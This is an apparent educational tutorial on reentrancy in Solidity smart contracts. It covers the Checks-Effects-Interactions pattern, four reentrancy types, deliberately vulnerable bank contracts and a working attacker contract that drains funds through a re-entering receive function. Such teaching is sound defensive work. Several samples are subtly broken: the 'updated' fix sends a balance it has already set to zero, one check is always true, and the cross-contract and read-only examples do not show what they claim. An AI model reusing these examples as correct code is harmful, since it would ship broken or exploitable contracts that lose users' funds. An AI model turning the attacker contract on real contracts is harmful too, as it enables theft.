<h1 align="center"><b>Reentrancy</b></h1>

Reentrancy is a vulnerability that can occur in smart contracts when they interact with other contracts. This vulnerability allows an attacker to repeatedly call back into the vulnerable contract before the current call completes, potentially leading to unexpected behavior and allowing the attacker to manipulate the contract's state.

1. **Contract Interaction**: Smart contracts often interact with other contracts on the Ethereum blockchain, either to transfer tokens, update state, or perform other operations.

2. **External Calls**: When a contract makes an external call to another contract using the `call` or `send` function, execution is temporarily transferred to the called contract. This means that the original contract's execution pauses while the called contract executes its code.

3. **Untrusted Contract Interaction**: In a reentrancy attack, an attacker exploits this pause in execution to call back into the original contract from within the called contract before the original call completes. This creates a loop where the attacker's contract can repeatedly call back into the vulnerable contract before the original call finishes.

4. **State Manipulation**: During each reentrant call, the attacker's contract can manipulate the state of the vulnerable contract, potentially altering balances, updating permissions, or performing other unauthorized actions.

5. **Unexpected Behavior**: Depending on the logic of the vulnerable contract, this repeated reentrant calling can lead to unexpected behavior, such as incorrect state changes, loss of funds, or denial of service.

6. **Example**: One common scenario where reentrancy can occur is in contracts that involve transferring funds. If the contract's state is updated after transferring funds but before updating the sender's balance, an attacker can exploit this window of opportunity to repeatedly call back into the contract, effectively withdrawing funds multiple times before the sender's `balance` is updated.

## Mitigation
To prevent reentrancy vulnerabilities, developers should follow best practices such as using the "Checks-Effects-Interactions" pattern, where state changes are made before interacting with external contracts, and using mechanisms like `reentrancy guard` to prevent multiple reentrant calls during the same transaction. Additionally, avoiding the use of `send` and `call.value` for transferring Ether, in favor of `transfer` or using withdrawal patterns, can help mitigate the risk of reentrancy attacks.

## Checks-Effects-Interactions:

Checks-Effects-Interactions are commonly used in the context of software development patterns and best practices, particularly in the Ethereum and smart contract development community.

- **Checks**: These refer to validation steps or conditions that need to be verified before proceeding with certain actions in a smart contract. Checks ensure that preconditions are met before executing critical operations.

- **Effects**: Effects encompass the changes or updates made to the state of the smart contract after certain conditions have been checked and validated. These changes typically involve modifying variables, updating balances, emitting events, or performing other state modifications.

- **Interactions**: Interactions involve communication and engagement with external entities, such as other smart contracts, Ethereum addresses, or off-chain systems. Interactions can include sending Ether, calling functions in other contracts, emitting events, or triggering external actions.

While Solidity itself provides language constructs for implementing these concepts, such as conditional statements (`if`, `require`, `assert`), state variables, and functions for interacting with external contracts (`call`, `send`, `transfer`), the categorization into "checks," "effects," and "interactions" is more of a conceptual framework or design pattern used by developers to structure their smart contracts in a clear and secure manner.


In Solidity, the Checks-Effects-Interactions pattern refers to a best practice for structuring smart contract functions to mitigate certain types of vulnerabilities, including reentrancy. Let's break down what each of these components entails within the context of Solidity:

1. **Checks**: 
   - Checks involve validating conditions before executing the main logic of the function. This ensures that the function can only proceed if certain prerequisites are met.
   - Common checks include verifying input parameters, ensuring that the sender has the required permissions or balance, and confirming that the contract is in the correct state to execute the desired operation.
   - Checks are typically performed using `if` or `require` or `assert` statements to validate conditions and revert the transaction if necessary.

2. **Effects**:
   - Effects encompass the changes made to the contract's state as a result of executing the function. This includes modifications to storage variables, updating balances, emitting events, or performing other state-altering operations.
   - It's crucial to ensure that all necessary state changes are made in this phase of the function execution. These changes should accurately reflect the intended behavior of the contract and the outcome of the function execution.

3. **Interactions**:
   - Interactions involve communicating with external contracts or accounts, such as sending Ether, calling functions on other contracts, or emitting events that trigger off-chain actions.
   - It's important to perform interactions after completing all state changes to minimize the risk of vulnerabilities like reentrancy.
   - Interactions should be carefully handled to account for potential failures, such as handling errors that occur during external calls and ensuring that the contract's state remains consistent.

To illustrate these concepts, let's consider a simple example of a Solidity function:

```javascript
function transfer(address recipient, uint256 amount) public {
    // Check if the sender has sufficient balance
    require(balance[msg.sender] >= amount, "Insufficient balance");

    // Effects: Update sender and recipient balances
    balance[msg.sender] -= amount;
    balance[recipient] += amount;

    // Interactions: Emit an event to log the transfer
    emit Transfer(msg.sender, recipient, amount);
}
```

**In this example**:
- The "checks" are performed using the `require` statement to ensure that the sender has sufficient balance to transfer the specified amount.
- The "effects" involve updating the `balances` of the sender and recipient in the contract's state.
- The "interactions" consist of `emitting an event` to log the transfer, which communicates the outcome of the transaction but doesn't involve external contracts or accounts in this case.


Let's consider another example, this time involving a contract that allows users to withdraw funds from their account balances:

```javascript
contract SimpleBank {
    mapping(address => uint256) public balances;

    event Withdrawal(address indexed account, uint256 amount);

    function withdraw(uint256 amount) public {
        // Checks: Ensure that the sender has a sufficient balance to withdraw
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Effects: Update the sender's balance
        balances[msg.sender] -= amount;

        // Interactions: Transfer Ether to the sender
        msg.sender.transfer(amount);

        // Emit an event to log the withdrawal
        emit Withdrawal(msg.sender, amount);
    }
}
```

In this example:

1. **Checks**:
   - The function starts with a check to ensure that the sender (`msg.sender`) has a sufficient balance to withdraw the specified amount. If the condition is not met, the function will revert, preventing the transaction from proceeding.

2. **Effects**:
   - After the check is successfully passed, the function proceeds to update the sender's `balance` by subtracting the withdrawn amount from their account `balance`. This modification reflects the effect of the withdrawal on the contract's state.

3. **Interactions**:
   - Once the state changes have been applied, the function performs the interaction by transferring Ether (`amount`) to the sender's address (`msg.sender`) using `transfer()`. This action effectively completes the withdrawal process by transferring funds to the user.
   - Additionally, the function emits an event (`Withdrawal`) to log the withdrawal transaction, providing transparency and allowing clients to monitor account activity.

This example demonstrates how the Checks-Effects-Interactions pattern can be applied in a contract that involves user interactions and state changes. By following this pattern, the contract ensures that critical checks are performed upfront, state changes are accurately reflected, and interactions with external entities are handled safely and consistently.

## Attacker's Perspective
**Example Vulnerable Contract**:

```javascript
contract VulnerableBank {
    
    mapping (address=>uint256) balance;
    
    function deposit () external payable {
        balance[msg.sender]+=msg.value;
    }

    // Note: The `withdraw()` function does not follows the Checks-Effects-Interactions pattern
    function withdraw () external payable{

        require(balance[msg.sender]>=0,'Not enough ether');          // Checks

        payable(msg.sender).call{value:balance[msg.sender]}("");     // Interactions

        balance[msg.sender]=0;                                       // Effects
    }

    function banksBalance () public view returns (uint256){
        return address(this).balance;
    }
    
    function userBalance (address _address) public view returns (uint256){
        return balance[_address];
    }
}
```

**Attack Scenario**:
- **Attacker**: The attacker creates a malicious contract. See below for Attacker's Contract.
- **Malicious contract**: Calls the `deposit` function on a vulnerable contract to increase its balance by 1 eth.
- **Vulnerable contract**: It records the `transfer` and increases the attacker’s contract `balance`.
- **Malicious contract**: Calls the `withdraw` function on a vulnerable contract to extract everything they deposited.
- **Vulnerable contract**: Checks if the stored `balance` of the attacker is greater than or equal to 0.
- **Vulnerable contract**: Yes, it is greater than 0 due to the transfer in 3.
- **Vulnerable contract**: It transfers the value of the deposited `amount` to the attacker’s contract.
- **Malicious contract**: When a transfer is received, the `receive` function is called.
- **Malicious contract**: The `receive` function checks if the bank’s `balance` is higher than 1 eth, if yes it calls the `withdraw` function again on the vulnerable contract.
- **Vulnerable contract**: Allows another `withdraw` because the attacker’s `balance` has not yet been updated.
…and so (6-10) on until all 10 eths are pulled out!

**Attacker's Contract**:

```javascript
contract LetsRobTheBank {
    
    VulnerableBank bank;
    
    constructor (address payable _target) {
        bank = VulnerableBank(_target);
    }
    
    function attack () public payable {
        bank.deposit{value:1 ether}();
        bank.withdraw();
    }
    function attackerBalance () public view returns (uint256){
        return address(this).balance;
    }
   
    receive () external payable {
        if(bank.banksBalance()>1 ether){
            bank.withdraw();
        } 
    } 
}
```

**How to protect yourself against reentrancy attack?**

Design functions based on the following principles – Checks Effects Interactions

- First – make all your checks,
- Then – make changes e.g. update balances,
- Finally – call another contract.

CEI pattern will eliminate most of the problems, so try to always build the contract logic based on this scheme. Make all your checks first, then update balances and make changes, and only then call another contract.

**Updated Vulnerable Contract**:

```javascript
contract VulnerableBank {
    
    mapping (address=>uint256) balance;
    
    function deposit () external payable {
        balance[msg.sender]+=msg.value;
    }

    // Note: The `withdraw()` function does not follows the Checks-Effects-Interactions pattern
    function withdraw () external payable{

        require(balance[msg.sender]>=0,'Not enough ether');          // Checks

        balance[msg.sender]=0;                                       // Effects
        
        payable(msg.sender).call{value:balance[msg.sender]}("");     // Interactions
    }

    function banksBalance () public view returns (uint256){
        return address(this).balance;
    }
    
    function userBalance (address _address) public view returns (uint256){
        return balance[_address];
    }
}
```


**Use mutex – add nonReentrant modifier**

- Use a ready-made implementation of `nonReentrant` modifier.
- Add `nonReentrant` modifier to all external functions.
- Go through all the functions and if you are sure that the vulnerability does not exist in a particular function, remove the modifier.

If for some reason it is not possible / too complicated / expensive to use the CEI pattern. Consider adding a mutex to the functions containing external calls. After calling the function, it will be marked as “entered” and lock the state. It will not allow you to call any function that is marked as `nonReentrant` until the state will be released again.

Remember not to treat mutexes as a silver bullet and do not exclude the option for presence of unsafe external calls in the case of integration with other smart contracts.

To protect yourself from design and business logic bugs, the best you can do is constantly raise awareness among your developers and try to prevent vulnerabilities before the code comes out.


## Types of reentrancy:
The reentrancy vulnerability is divided into four different types. They are,

- Single function reentrancy
- Cross-function reentrancy
- Cross-contract Reentrancy
- Read-only Reentrancy

### Single function reentrancy: 
   - In single-function reentrancy, the vulnerability occurs within the same function of a contract. This typically happens when the contract performs external calls to other contracts or accounts before completing its internal state changes.
   - An attacker exploits this vulnerability by recursively calling the same function of the contract before the previous call completes, allowing them to manipulate the contract's state unpredictably.
   - Single function reentrancy vulnerability is often the result of improper sequencing of state changes and external calls within a function.
   - This type of attack is the simplest and easiest to prevent. It occurs when the vulnerable function is the same function the attacker is trying to recursively call. For example:

```javascript
contract Vulnerable {
    mapping (address => uint) private balances;

    function withdraw() public {
      // Effects
      uint amount = balances[msg.sender]; 
      // Interactions   
      (bool success, ) = msg.sender.call.value(amount)("");
      require(success);
      // Additional Effects (this line is vulnerable to reentrancy)
      balances[msg.sender] = 0;
    }
}
```

In the above code, the `withdraw()` function is vulnerable to a single function reentrancy attack. An attacker can repeatedly call the `withdraw()` function before updating the `balance`, resulting in multiple withdrawals.


**Another Example**:

```javascript
contract Vulnerable {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) public {
        
        // Checks: Checks whether the User has neccessary balances 
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Effects: Update sender's balance
        uint256 balanceBeforeWithdrawal = balances[msg.sender];
        balances[msg.sender] -= amount;

        // Interactions: Perform external call
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success, "Transfer failed");

        // Additional effects (this line is vulnerable to reentrancy)
        balances[msg.sender] = balanceBeforeWithdrawal;
    }
}
```

In this example, the contract attempts to update the sender's balance after performing an external call to transfer Ether. However, the order of operations allows an attacker to reenter the `withdraw` function before the `balance` update, allowing them to repeatedly withdraw funds.

### Cross-function reentrancy: 
   - Cross-function reentrancy involves multiple functions within the same contract. The vulnerability arises when one function makes an external call to another function before completing its own state changes.
   - An attacker can exploit this vulnerability by calling into the same contract from within the externally called function, potentially reentering the original function or other functions within the contract.
   - Cross-function reentrancy vulnerability can be challenging to detect as it involves interactions between different functions within the same contract.
   - This type of attack is more complex and harder to prevent. It occurs when the vulnerable function calls another function that is also vulnerable to reentrancy. For example:


```javascript
contract Vulnerable {
    mapping (address => uint) private balances;

    function transfer(address to, uint amount) public {

        // Checks
        if (balances[msg.sender] >= amount) {

        // Effects
        balances[to] += amount;
        balances[msg.sender] -= amount;
        }
    }

    function withdraw() public {

        // Checks
        uint amount = balances[msg.sender];

        // Interactions
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);

        // Effects
        balances[msg.sender] = 0;
    }
}
```

- The `withdraw` function initiates a `transfer` of funds to the caller using a low-level `call`.
- Before the function completes and sets the `balance` to zero, it does not prevent other functions (such as `transfer`) from being called.
- An attacker can exploit this by calling the `withdraw` function and, during the `call`, reentering the contract through another function like `transfer`, taking advantage of the fact that the `balance` has not yet been set to zero.

### Explanation to above Vulnerable contract:

The `Vulnerable` contract does not strictly adhere to the Checks-Effects-Interactions pattern.

1. **Transfer Function**:
   - **Checks**: The `transfer` function checks if the sender (`msg.sender`) has a sufficient `balance` to perform the `transfer`. This check ensures that the `transfer` is only executed when the sender has enough funds.
   - **Effects**: If the sender has a sufficient `balance`, the function updates the balances of the sender and the recipient accordingly.
   - **Interactions**: There is no interactions in `transfer` function.

2. **Withdraw Function**:
   - **Checks**: The `withdraw` function retrieves the balance of the caller (`msg.sender`) and uses it for the withdrawal. However, it does not explicitly check if the `balance` is greater than zero before initiating the withdrawal, which could lead to unnecessary gas expenditure if the balance is zero.(i.e, `amount = 0`)
   - **Effects**: After retrieving the `balance`, the function initiates an `external call` using `msg.sender.call.value(amount)("")` to transfer funds to the caller. Then, it immediately sets the caller's `balance` to zero.
   - **Interactions**: The external call to transfer funds is performed before the state change of setting the balance to zero, violating the sequencing principle of the Checks-Effects-Interactions pattern.


In summary, while the `transfer` function in the `Vulnerable` contract follows the Checks-Effects-Interactions pattern by performing state changes before interactions, the `withdraw` function violates this pattern by initiating an external call before completing its internal state changes. This violation exposes the contract to reentrancy vulnerabilities. To mitigate this vulnerability, developers should ensure that all state changes are completed before interacting with external contracts or accounts, following the Checks-Effects-Interactions pattern consistently across all contract functions.

**Another Example**:

```javascript
contract Vulnerable {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) public {

        // Checks: Checks whether the User has neccessary balances 
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Effects: Update sender's balance
        balances[msg.sender] -= amount;

        // Interactions: External function call
        externalFunction();

        // Additional Effects after the Interactions (this line is vulnerable to reentrancy)
        balances[msg.sender] += amount;
    }

    function externalFunction() external {
        // Some external logic
        // Vulnerable to reentrancy attack
        msg.sender.call("");
    }
}

```
In this example, the `withdraw` function calls an external function `externalFunction` before completing its state changes. The external function contains reentrancy vulnerability, an attacker can exploit it to reenter the `withdraw` function and manipulate the sender's `balance`.

### Cross-contract Reentrancy:
   - Cross-contract reentrancy occurs when a contract interacts with external contracts, and the vulnerability lies in the interaction between different contracts.
   - An attacker exploits this vulnerability by recursively calling back into the vulnerable contract from within an external contract before the original call completes, potentially causing unexpected behavior or manipulating the state of the contracts involved.
   - This type of reentrancy vulnerability often arises when contracts trust external contracts to perform certain actions without properly validating or handling the consequences of the interactions.

```javascript
contract Vulnerable {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) public {

        // Checks: Whether the `user` has neccessary amount
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Effects: Update sender's balance
        balances[msg.sender] -= amount;

        // Interactions: External contract call
        ExternalContract externalContract = ExternalContract(msg.sender);
        externalContract.withdraw(amount);

        // Additional effects (this line is vulnerable to reentrancy)
        balances[msg.sender] += amount;
    }
}

contract ExternalContract {
    function withdraw(uint256 amount) external {
        // Some logic
        // Vulnerable to reentrancy attack
        msg.sender.call("");
    }
}
```
In this example, the `withdraw` function of the `ExternalContract` is vulnerable to reentrancy. When called by the `Vulnerable` contract, an attacker can exploit this vulnerability to reenter the `Vulnerable` contract and manipulate the sender's `balance`.


### Read-only Reentrancy:
   - Read-only reentrancy is a specific type of reentrancy vulnerability where the attacker is limited to reading contract state during the reentrant call, without the ability to modify state directly.
   - While read-only reentrancy may seem less severe than other types, it can still lead to information leakage or manipulation of contract behavior based on the observed state.
   - This type of vulnerability may occur when contracts allow external calls to view certain state variables without adequate protection against reentrancy attacks.

In the example below, a banking contract is presented that permits users to deposit and withdraw:

```javascript
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Bank is ReentrancyGuard {
    mapping (address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {

        // Checks
        uint amount = balances[msg.sender];

        // Interactions
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success);

        // Effects
        balances[msg.sender] = 0;
    }
}
```

The `Bank` contract protects itself against reentrancy issues by using OpenZeppelin's `ReentrancyGuard`. Additionally, a third-party smart contract exists that uses the bank's publicly available `balances` mapping for its own business logic, e.g. managing shares based on a user's investment in the bank:

```javascript
contract BankConsumer {
    Bank private bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }
    function getBalance(address account) public view returns (uint256) {
        return bank.balances(account);
    }
}
```
The bank's `withdraw` function is safeguarded against reentrancy. Still, this guard only applies to the contract itself and does not extend to other systems. The execution flow of the external call in `withdraw` can be taken over by an attacker, who can then craft a smart contract that presents a misleading balance while interacting with other projects.

In this case, `BankConsumer` is such a project, merely exposing a `view` function for illustration purposes. Such a `view` function could be internally utilized elsewhere, e.g. for assigning shares and a check preventing users to liquidate more shares than they own. An outdated `balance` exposed by the `Bank` contract can be exploited by designing a malicious receive function:

```javascript
contract Attacker {
    event Checkpoint(uint256 balance);

    Bank private bank;
    BankConsumer private consumer;

    constructor(address _bank, address _consumer) payable {
        bank = Bank(_bank);
        consumer = BankConsumer(_consumer);
    }

    function attack() public {
        emit Checkpoint(consumer.getBalance(address(this)));
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        emit Checkpoint(consumer.getBalance(address(this)));
    }

    receive() external payable  {
        emit Checkpoint(consumer.getBalance(address(this)));
        // more malicious code here
    }
}
```
The Attacker contract records Checkpoint events, illustrating that the balances visible to the `BankConsumer` contract are outdated. When the system is set up in `Remix`, and the attack function is executed, the following events are logged by the Attacker contract:

```javascript
[
    {
        "from": "0xE3Ca443c9fd7AF40A2B5a95d43207E763e56005F",
        "topic": "0xde5ae8a37da230f7df39b8ea385fa1ab48e7caa55f1c25eaaef1ed8690f36998",
        "event": "Checkpoint",
        "args": {
            "0": "0",
            "balance": "0"
        }
    },
    {
        "from": "0xE3Ca443c9fd7AF40A2B5a95d43207E763e56005F",
        "topic": "0xde5ae8a37da230f7df39b8ea385fa1ab48e7caa55f1c25eaaef1ed8690f36998",
        "event": "Checkpoint",
        "args": {
            "0": "1000000000000000000",
            "balance": "1000000000000000000"
        }
    },
    {
        "from": "0xE3Ca443c9fd7AF40A2B5a95d43207E763e56005F",
        "topic": "0xde5ae8a37da230f7df39b8ea385fa1ab48e7caa55f1c25eaaef1ed8690f36998",
        "event": "Checkpoint",
        "args": {
            "0": "0",
            "balance": "0"
        }
    }
]
```
The second Checkpoint event indicates that, during the `receive` function, the `Bank` contract still presents a `balance` of 1 ETH for the Attacker contract address despite the funds having been transferred to the attacker. This outdated information can be manipulated to mislead third-party infrastructure building on the Bank contract, such as `BankConsumer`.


**Another Example**:

```javascript
contract Vulnerable {
    mapping(address => uint256) public balances;

    function viewBalance(address account) external view returns (uint256) {
        // Vulnerable to read-only reentrancy
        return balances[account];
    }
}

contract Attacker {
    Vulnerable vulnerableContract;

    constructor(address vulnerableAddress) public {
        vulnerableContract = Vulnerable(vulnerableAddress);
    }

    function viewAndManipulateBalance(address account) external {
        // Read the balance
        uint256 balance = vulnerableContract.viewBalance(account);

        // Manipulate contract behavior based on the observed balance
        if (balance > 100) {
            // Do something
        }
    }
}
```
In this example, the `viewBalance` function of the Vulnerable contract is vulnerable to read-only reentrancy. An attacker can call this function recursively, observing the `balance` of multiple accounts, and manipulate the behavior of another contract (Attacker) based on the observed balances.


### Conclusion :
Each type of reentrancy vulnerability presents unique challenges and risks, but they all share the common characteristic of allowing attackers to exploit the sequential execution of contract code to their advantage. Solidity developers should be aware of these vulnerabilities and follow best practices, such as using mutex patterns or reentrancy guards, to prevent and mitigate their impact.

To prevent reentrancy attacks, you should avoid making external calls in critical sections of your code, and use the nonReentrant modifier provided by the OpenZeppelin library or implement the Checks-Effects-Interactions pattern.